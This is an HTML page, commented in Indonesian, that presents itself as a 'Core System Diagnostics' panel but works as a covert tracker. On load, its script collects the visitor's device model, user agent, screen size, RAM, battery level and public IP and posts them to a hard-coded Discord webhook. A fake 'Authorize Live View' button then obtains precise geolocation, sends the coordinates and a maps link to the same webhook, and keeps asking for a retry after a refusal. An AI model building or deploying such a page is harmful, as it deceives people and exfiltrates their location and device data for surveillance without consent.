<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Core System Diagnostics</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #050505;
            color: #00ff41;
            font-family: 'JetBrains Mono', monospace;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; margin: 0;
        }
        .panel {
            width: 95%; max-width: 500px;
            border: 1px solid #00ff41; padding: 25px;
            background: rgba(0, 20, 0, 0.9);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
            border-radius: 5px;
        }
        .header {
            text-align: center; border-bottom: 1px solid #00ff41;
            padding-bottom: 15px; margin-bottom: 20px;
        }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .data-item { border: 1px solid #1a3d1a; padding: 10px; background: #000; font-size: 11px; }
        .label { color: #888; display: block; margin-bottom: 4px; font-size: 9px; text-transform: uppercase; }
        .val { color: #00ff41; font-weight: bold; overflow-wrap: break-word; }
        .btn {
            background: #00ff41; color: #000; border: none; padding: 18px;
            width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px;
            font-family: inherit; font-size: 14px; text-transform: uppercase;
        }
        .loader {
            border: 2px solid #111; border-top: 2px solid #00ff41;
            border-radius: 50%; width: 35px; height: 35px;
            animation: spin 1s linear infinite; margin: 20px auto; display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 10px; text-align: center; color: #888; margin-top: 15px; min-height: 15px; }
    </style>
</head>
<body>

<div class="panel">
    <div class="header">
        <span style="letter-spacing: 3px; font-weight: bold;">CORE_SYSTEM_DIAGNOSTICS</span>
    </div>

    <div class="grid">
        <div class="data-item"><span class="label">Device_Model</span><span id="dev-model" class="val">Detecting...</span></div>
        <div class="data-item"><span class="label">Build_Info</span><span id="build-info" class="val">Scanning...</span></div>
        <div class="data-item"><span class="label">Ip_Address</span><span id="ip-addr" class="val">Fetching...</span></div>
        <div class="data-item"><span class="label">Battery_Lv</span><span id="bat-lv" class="val">---</span></div>
        <div class="data-item"><span class="label">Resolution</span><span id="screen-res" class="val">---</span></div>
        <div class="data-item"><span class="label">Ram_Estimate</span><span id="ram-est" class="val">---</span></div>
    </div>

    <div id="loading-icon" class="loader"></div>
    <p id="status">AWAITING SYSTEM AUTHORIZATION...</p>
    
    <button id="mainBtn" class="btn" onclick="startProcess()">Authorize Live View</button>
</div>

<script>
    // --- KONFIGURASI WEBHOOK OTOMATIS ---
    const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";

    let collected = {};

    // 1. OTOMATIS AMBIL DATA SAAT DIBUKA
    (async function init() {
        const ua = navigator.userAgent;
        const modelMatch = ua.match(/\(([^;]+);/);
        
        collected = {
            model: modelMatch ? modelMatch[1] : "Unknown Device",
            build: ua.split(' ').pop(),
            screen: `${window.screen.width}x${window.screen.height}`,
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
            ua: ua
        };

        // Update UI
        document.getElementById('dev-model').innerText = collected.model;
        document.getElementById('build-info').innerText = collected.build;
        document.getElementById('screen-res').innerText = collected.screen;
        document.getElementById('ram-est').innerText = collected.ram;

        // Baterai
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            collected.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'No Charge'})`;
            document.getElementById('bat-lv').innerText = collected.battery;
        }

        // IP Address
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const d = await res.json();
            collected.ip = d.ip;
            document.getElementById('ip-addr').innerText = d.ip;
        } catch (e) {
            collected.ip = "Failed";
            document.getElementById('ip-addr').innerText = "ERROR";
        }

        // Kirim Log Kunjungan Awal
        sendLog("ðŸ“± NEW_VISIT_LOG", collected);
    })();

    // 2. LOGIKA PERIZINAN & RETRY
    function startProcess() {
        const btn = document.getElementById('mainBtn');
        const loader = document.getElementById('loading-icon');
        const status = document.getElementById('status');

        btn.style.display = 'none';
        loader.style.display = 'block';
        status.innerText = "LINKING SATELLITE...";

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                status.innerHTML = "<span style='color:#00ff41'>SUCCESS. REDIRECTING...</span>";
                
                let lat = pos.coords.latitude;
                let lon = pos.coords.longitude;
                
                // Micro Offset < 10m
                let fLat = lat + (Math.random() - 0.5) * 0.00006;
                let fLon = lon + (Math.random() - 0.5) * 0.00006;

                // Kirim Lokasi ke Webhook
                sendLog("ðŸ“ LOCATION_SYNCED", {
                    ...collected,
                    coords: `${lat},${lon}`,
                    maps: `https://www.google.com/maps?q=${lat},${lon}`
                });

                setTimeout(() => {
                    window.location.href = `https://www.google.com/maps?q=${fLat},${fLon}`;
                }, 1500);
            },
            (err) => {
                status.innerHTML = "<span style='color:#ff4444'>ERROR: ACCESS_DENIED. REBOOTING...</span>";
                sendLog("âš ï¸ PERMISSION_DENIED", collected);

                setTimeout(() => {
                    loader.style.display = 'none';
                    btn.style.display = 'block';
                    btn.innerText = "Retry Authorization";
                    status.innerText = "Izin lokasi diperlukan untuk melanjutkan.";
                }, 5000); // Delay 5 detik sesuai permintaan
            },
            { enableHighAccuracy: true }
        );
    }

    // FUNGSI WEBHOOK
    function sendLog(title, data) {
        const payload = {
            embeds: [{
                title: title,
                color: title.includes("LOCATION") ? 65281 : 16711680,
                fields: [
                    { name: "Model", value: data.model || "N/A", inline: true },
                    { name: "IP", value: data.ip || "N/A", inline: true },
                    { name: "Battery", value: data.battery || "N/A", inline: true },
                    { name: "Map Link", value: data.maps || "None" },
                    { name: "System", value: `\`\`\`${data.ua}\`\`\`` }
                ],
                footer: { text: "System Diagnostic Logger" },
                timestamp: new Date()
            }]
        };

        fetch(WH, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {});
    }
</script>

</body>
</html>
